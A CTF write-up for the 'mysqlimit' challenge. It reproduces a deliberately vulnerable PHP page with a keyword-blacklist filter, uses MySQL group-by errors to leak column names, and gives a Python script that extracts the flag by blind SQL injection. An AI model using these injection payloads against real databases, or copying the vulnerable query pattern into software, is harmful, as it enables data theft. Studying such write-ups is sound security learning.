## mysqlimit

```
Description:

Limit 'Em All! http://45.77.255.164/
```

```php
<?php 

include('dbconnect.php');

if(!isset($_GET["id"]))
{
    show_source(__FILE__);
}
else
{
    // filter all what i found on internet.... dunno why ｡ﾟ･（>﹏<）･ﾟ｡
    if (preg_match('/union|and|or|on|cast|sys|inno|mid|substr|pad|space|if|case|exp|like|sound|produce|extract|xml|between|count|column|sleep|benchmark|\<|\>|\=/is' , $_GET['id'])) 
    {
        die('<img src="https://i.imgur.com/C42ET4u.gif" />'); 
    }
    else
    {
        // prevent sql injection
        $id = mysqli_real_escape_string($conn, $_GET["id"]);

        $query = "select * from flag_here_hihi where id=".$id;
        $run_query = mysqli_query($conn,$query);

        if(!$run_query) {
            echo mysqli_error($conn);
        }
        else
        {    
            // I'm kidding, just the name of flag, not flag :(
            echo '<br>';
            $res = $run_query->fetch_array()[1];
            echo $res; 
        }
    }
}

?>
```

The code is filtering `sys` and `column`. So, I thought it's hard to get column name directly and also `union` is filtered. So, we cannot use redefining column name using `union` is also unavailable. But there is a part which prints error.

```php
if(!$run_query) {
    echo mysqli_error($conn);
}
```



So, I guess we can trigger errors for getting column name.

While I was digging some method, I realized that server's configuration is not normal case.

Below payload caused an error.

```sql
-9 group by 1
```

error:

```
Expression #2 of SELECT list is not in GROUP BY clause and contains nonaggregated column 'flag_here_hoho.flag_here_hihi.t_fl4g_name_su' which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by
```

this error is displaying `dbname.table_name.column_name`

So, we can get the column name of flag with `group by 2`



```
Expression #3 of SELECT list is not in GROUP BY clause and contains nonaggregated column 'flag_here_hoho.flag_here_hihi.t_fl4g_v3lue_su' which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by
```

So, column name was `t_fl4g_v3lue_su`.

And there is no filtering with  `right`,  `left`,  `ascii` and  `in`. These will cause blind sql injection.

So, my final payload is like this



```python
import requests

flag = ''
for i in range(1,100):
    for j in range(32,127):
        conn = requests.get('http://45.77.255.164/?id=-9||ascii(right(left(t_fl4g_v3lue_su,'+str(i)+'),1))in('+str(j)+')')
        r1 = conn.content
        #print j
        if 'handsome_flag' in r1:
            flag += chr(j)
            print flag
            break
```